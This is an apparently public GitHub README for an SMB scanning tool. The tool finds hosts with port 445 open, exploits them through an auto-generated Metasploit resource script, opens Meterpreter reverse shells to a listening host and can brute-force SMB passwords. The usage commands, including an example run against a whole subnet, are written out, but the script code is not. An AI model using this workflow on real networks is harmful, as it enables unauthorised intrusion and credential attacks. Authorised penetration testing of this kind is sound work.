# SMB Vulnerability Scanner

This Python script is designed to scan for vulnerable SMB (Server Message Block) hosts on a network and exploit them using Metasploit. It can also perform SMB brute-force attacks if a password file is provided.

## How it Works

The script utilizes the `nmap` library to scan the specified network for hosts with port 445 (SMB) open. It then checks if the port is open and adds the target hosts to a list.

Once the targets are identified, the script generates a Metasploit resource script (`meta.rc`) to exploit the discovered vulnerabilities. It sets up a handler for incoming connections, exploits the vulnerabilities using various Metasploit modules, and launches a Meterpreter shell on the compromised hosts.

## Usage

To use the script, follow these steps:

1. Clone the repository to your local machine:
```
git clone https://github.com/blackmagic2023/smb-scanner.git
```
2. Navigate to the script directory:
```
cd smb-scanner
```
3. Run the script with the following command:
```
python3 smb-scanner.py -H <target_host(s)> -l <listening_host> [-p <listening_port> -F <password_file>]
```
Replace `<target_host(s)>` with the target IP address or range (e.g., `192.168.1.0/24`), `<listening_host>` with your local IP address, `<listening_port>` with the port number to listen on (default is `1337`), and `<password_file>` with the file containing passwords for SMB brute-force attacks (optional).

For example:
```
python3 smb-scanner.py -H 192.168.1.0/24 -l 10.0.0.1 -p 4444 -F passwords.txt
```
4. Follow the on-screen instructions and wait for the script to complete the scan and exploitation process.

## Requirements

- Python 3.x
- `nmap` library (install using `pip install python-nmap`)
- Metasploit (install separately and ensure it's in your PATH)

## Disclaimer

This script is for educational purposes only. Use it responsibly and only on systems you own or have explicit permission to test.



